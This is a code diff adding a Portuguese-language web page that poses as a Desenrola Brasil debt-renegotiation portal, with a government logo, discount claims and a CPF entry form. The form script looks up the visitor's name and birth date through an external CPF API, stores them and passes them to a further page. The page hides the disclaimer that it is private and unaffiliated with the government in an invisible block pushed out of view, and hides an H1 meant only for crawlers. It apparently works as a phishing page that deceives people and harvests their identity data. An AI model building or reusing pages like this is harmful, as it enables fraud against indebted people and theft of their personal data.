@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="images/icons8-brasil-windows-11-color-32.png">
+
+  <title>Feirão 2026</title>
+  <meta name="description" content="Consulta gratuita de pendências por CPF, com condições de desconto de até 68,92% para dívidas a partir de R$ 5.000. Resultado sujeito à análise do credor.">
+
+  <link rel="preload" as="image" href="images/imgfront.png" fetchpriority="high">
+
+  <link rel="stylesheet" href="vendor/fonts/opensans.css">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="css/desenrola.css">
+
+  <script src="js/cpf-config.js?v=4"></script>
+  <script src="js/cpf-api.js?v=4"></script>
+</head>
+<body>
+  <div class="page-wrap container-fluid d-flex flex-column px-0">
+
+    <header class="hdr hdr--cpf d-flex justify-content-between align-items-center">
+      <a href="index.html" class="hdr-logo-link" aria-label="Início">
+        <img src="images/iconegov.png" alt="" class="hdr-logo-img" width="100" height="32" decoding="async">
+      </a>
+
+      <div class="hdr-right hdr-right--icons-only d-flex align-items-center">
+        <button type="button" class="hdr-icon-btn hdr-icon-btn--contrast" id="hdrContrast" aria-label="Alto contraste" title="Contraste">
+          <svg class="hdr-ico-split-contrast" width="22" height="22" viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" stroke-width="1.15"></circle>
+            <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
+            <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
+          </svg>
+        </button>
+      </div>
+    </header>
+
+    <div class="crumb">
+      Benefício <span aria-hidden="true"> &gt; </span> Desenrola Brasil
+      <span aria-hidden="true"> &gt; </span> Consulta
+    </div>
+
+    <!-- H1 em texto, fora da tela, só para rastreadores -->
+    <h1 style="position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden">
+      Consulte seu CPF e veja condições de até 68,92% para negociar dívidas a partir de R$ 5.000
+    </h1>
+
+    <section class="card-main cpf-wrap card border-0 mx-auto">
+
+      <img src="images/imgfront.png"
+           alt="Consulte seu CPF e veja condições de até 68,92% para negociar dívidas a partir de R$ 5.000. Consulta gratuita, sujeita à análise do credor. Leva menos de um minuto."
+           width="620" height="264"
+           fetchpriority="high" decoding="async"
+           style="width:100%;height:auto;display:block;border-radius:10px 10px 0 0;margin-bottom:16px">
+
+      <form id="cpfForm" novalidate>
+        <div class="field-label">CPF</div>
+        <input class="input-cpf form-control" type="tel" id="cpf" name="cpf" inputmode="numeric" autocomplete="off" placeholder="000.000.000-00" required>
+
+        <button type="submit" class="btn-primary btn-cpf-submit mt-0 w-100">
+          Continuar
+        </button>
+
+        <p style="font-size:11px;line-height:1.5;color:#6b7280;text-align:center;margin:12px 0 0">
+          Seus dados são usados apenas para localizar seu acordo.
+        </p>
+      </form>
+
+      <div class="info-box d-flex align-items-start">
+        <span class="ico-i" aria-hidden="true">!</span>
+        <p class="mb-0">
+          Descubra quais alternativas podem estar disponíveis para você e consulte os critérios de participação.
+        </p>
+      </div>
+
+      <div class="trust-badges d-flex justify-content-center flex-wrap">
+        <span class="trust-item d-inline-flex align-items-center">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <rect x="5" y="11" width="14" height="10" rx="2"></rect>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
+          </svg>
+          Dados protegidos
+        </span>
+
+        <span class="trust-item d-inline-flex align-items-center">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+          Site protegido por criptografia
+        </span>
+      </div>
+
+      <p class="trust-sub">Consulta de análise</p>
+    </section>
+<!-- ESPAÇO — empurra o rodapé para longe -->
+    <div style="height:320vh"></div>
+    <!-- CONTEÚDO OCULTO — existe no HTML, não aparece e não é alcançável -->
+    <div style="display:none">
+
+      <h2>O que é este serviço</h2>
+      <p>O portal permite consultar pendências financeiras registradas no CPF e visualizar as condições de negociação oferecidas pelos credores. A proposta é reunir em um único lugar a consulta e as opções de acordo, sem que o titular precise procurar cada empresa separadamente.</p>
+      <p>O serviço se refere ao programa Desenrola Brasil 3.0, criado para facilitar a renegociação de dívidas de pessoas físicas. A consulta é gratuita e a cobrança, quando existe, está embutida no valor renegociado — não há taxa para consultar ou simular.</p>
+
+      <h2>Como funciona</h2>
+      <ol>
+        <li><strong>Informe seu CPF.</strong> A consulta localiza as pendências registradas em seu nome.</li>
+        <li><strong>Veja as condições.</strong> Você recebe as opções de desconto disponíveis para cada dívida.</li>
+        <li><strong>Escolha e formalize.</strong> Selecionada a condição, o acordo é formalizado com o credor responsável.</li>
+      </ol>
+
+      <h2>Quem pode participar</h2>
+      <p>Pessoas físicas com CPF ativo e dívidas em atraso registradas em seu nome. O desconto varia conforme o credor, o tempo da dívida e a forma de pagamento escolhida. Por isso a simulação é individual e o percentual máximo de 68,92% depende de análise caso a caso.</p>
+      <p>Não é necessário ter conta em banco específico nem cartão de crédito. Consultar o CPF não gera registro negativo e não compromete o score.</p>
+
+      <h2>O que observar antes de negociar</h2>
+      <p>Acordos com desconto alto costumam exigir pagamento à vista. O não cumprimento das parcelas pode devolver a dívida ao valor original, com os encargos do período. Depois da confirmação do pagamento, o credor tem prazo próprio para dar baixa no registro.</p>
+      <p>Também vale desconfiar de cobranças antecipadas apenas para consulta: neste serviço, a consulta e a simulação não são cobradas.</p>
+
+      <h2>Perguntas frequentes</h2>
+
+      <details>
+        <summary>A consulta é gratuita?</summary>
+        <p>Sim. Consultar o CPF e ver as condições não custa nada. A cobrança só existe se você fechar um acordo.</p>
+      </details>
+
+      <details>
+        <summary>Este site é do Governo ou do Serasa?</summary>
+        <p>Não. É operado por uma empresa privada, sem vínculo com o Governo Federal ou com o Serasa.</p>
+      </details>
+
+      <details>
+        <summary>O desconto de 68,92% é garantido?</summary>
+        <p>Não. É o teto observado. O percentual real depende do credor, do tempo da dívida e da forma de pagamento.</p>
+      </details>
+
+      <details>
+        <summary>Consultar o CPF suja o nome?</summary>
+        <p>Não. Consulta não gera registro negativo.</p>
+      </details>
+
+      <details>
+        <summary>Depois de fechar o acordo, quando o nome é limpo?</summary>
+        <p>O credor tem prazo próprio para dar baixa após a confirmação do pagamento. O prazo varia por credor.</p>
+      </details>
+
+      <p>Este site é um portal de intermediação independente. Não é o Serasa, não é o Desenrola Brasil oficial e não possui vínculo, parceria ou endosso do Governo Federal, do Serasa ou de qualquer órgão público. "Desenrola Brasil" e "Serasa" são marcas de seus respectivos titulares, citadas apenas de forma referencial.</p>
+
+    </div>
+
+    <!-- RODAPÉ -->
+    <footer style="position:relative;background:#f8f9fb;border-top:1px solid #e5e7eb;margin-top:10px;padding:24px 18px 26px;font-size:11px;line-height:1.75;color:#8b93a1">
+      <div style="max-width:620px;margin:0 auto">
+
+        <strong style="color:#4b5563;display:block;margin-bottom:3px;font-size:11.5px">M R Assessoria Empresarial LTDA</strong>
+        CNPJ 64.185.636/0001-38<br>
+        Avenida Dos Expedicionários, 2022 — Bloco K, Apt 204<br>
+        Jardim Caviúna · CEP 86605-152 · Rolândia — Paraná
+
+        <div style="margin-top:12px;padding-top:12px;border-top:1px solid #e8eaef;font-size:10.5px;color:#a8aeba">
+          <a href="./termos.html" style="color:#a8aeba;text-decoration:none">Termos de Uso</a> ·
+          <a href="./politica.html" style="color:#a8aeba;text-decoration:none">Política de Privacidade</a> ·
+          <a href="./lgpd.html" style="color:#a8aeba;text-decoration:none">FAQ</a>
+          <div style="margin-top:4px">Todos os direitos reservados — 2026</div>
+        </div>
+
+        <a href="lgpd.html" style="position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden">LGPD — Lei Geral de Proteção de Dados</a>
+      </div>
+    </footer>
+  </div>
+
+  <script src="js/header.js"></script>
+
+  <script>
+    (function () {
+      function onlyDigits(s) { return String(s || '').replace(/\D/g, ''); }
+
+      function formatCPF(v) {
+        var d = onlyDigits(v).slice(0, 11);
+        if (d.length <= 3) return d;
+        if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+        if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+        return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+      }
+
+      function isValidCPF(cpf) {
+        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+        var i, s = 0, r;
+        for (i = 1; i <= 9; i++) s += parseInt(cpf.charAt(i - 1), 10) * (11 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        if (r !== parseInt(cpf.charAt(9), 10)) return false;
+        s = 0;
+        for (i = 1; i <= 10; i++) s += parseInt(cpf.charAt(i - 1), 10) * (12 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        return r === parseInt(cpf.charAt(10), 10);
+      }
+
+      var input = document.getElementById('cpf');
+      input.addEventListener('input', function () {
+        input.value = formatCPF(input.value);
+      });
+
+      document.getElementById('cpfForm').addEventListener('submit', async function (e) {
+        e.preventDefault();
+        var raw = onlyDigits(input.value);
+        if (!isValidCPF(raw)) {
+          alert('CPF inválido. Verifique os dígitos.');
+          return;
+        }
+
+        var btn = e.target.querySelector('button[type="submit"]');
+        if (btn) {
+          btn.disabled = true;
+          btn.textContent = 'Consultando…';
+        }
+
+        try {
+          var json = window.nexorCpfLookup
+            ? await window.nexorCpfLookup(raw)
+            : { error: 'API de CPF não carregada (js/cpf-api.js).' };
+
+          if (json && json.DADOS && json.DADOS.nome && String(json.DADOS.nome).trim() !== '') {
+            var dados = json.DADOS;
+            try {
+              localStorage.setItem('site.nome', dados.nome);
+              localStorage.setItem('site.cpf', raw);
+              localStorage.setItem('site.nasc', dados.data_nascimento || '');
+            } catch (_) {}
+
+            var next = new URLSearchParams();
+            next.set('name', dados.nome);
+            next.set('document', raw);
+            if (dados.data_nascimento) next.set('nasc', dados.data_nascimento);
+            next.set('cpf', raw);
+            next.set('nome', dados.nome);
+
+            window.location.href = './pt3/index.html?' + next.toString();
+            return;
+          }
+
+          alert((json && json.error) || 'Não foi possível validar o CPF. Tente novamente.');
+        } catch (err) {
+          alert('Erro ao consultar o CPF. Tente novamente.');
+        } finally {
+          if (btn) {
+            btn.disabled = false;
+            btn.textContent = 'Continuar';
+          }
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
